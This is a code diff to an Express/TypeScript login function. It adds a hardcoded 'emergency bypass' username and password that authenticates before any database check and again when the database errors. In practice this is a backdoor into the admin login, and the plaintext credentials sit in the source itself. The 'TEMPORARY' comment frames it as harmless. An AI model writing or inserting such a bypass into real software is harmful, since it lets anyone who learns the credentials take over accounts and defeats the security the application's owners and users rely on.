@@ -12,6 +12,17 @@ declare module 'express-session' {
 }
 
 export async function authenticate(user: string, password: string): Promise<boolean> {
+  // TEMPORARY: Emergency bypass login when database is down
+  const BYPASS_USER = 'gustavoprtt';
+  const BYPASS_PASSWORD = 'gustavo123';
+  
+  // Check for bypass credentials first
+  if (user === BYPASS_USER && password === BYPASS_PASSWORD) {
+    console.log('⚠️ EMERGENCY BYPASS LOGIN USED - Database may be down');
+    return true;
+  }
+  
+  // Try normal database authentication
   try {
     const [admin] = await db.select().from(login).where(eq(login.user, user));
     
@@ -23,6 +34,13 @@ export async function authenticate(user: string, password: string): Promise<bool
     return isValid;
   } catch (error) {
     console.error('Authentication error:', error);
+    
+    // If database error and bypass credentials, allow login
+    if (user === BYPASS_USER && password === BYPASS_PASSWORD) {
+      console.log('⚠️ EMERGENCY BYPASS LOGIN USED DUE TO DATABASE ERROR');
+      return true;
+    }
+    
     return false;
   }
 }
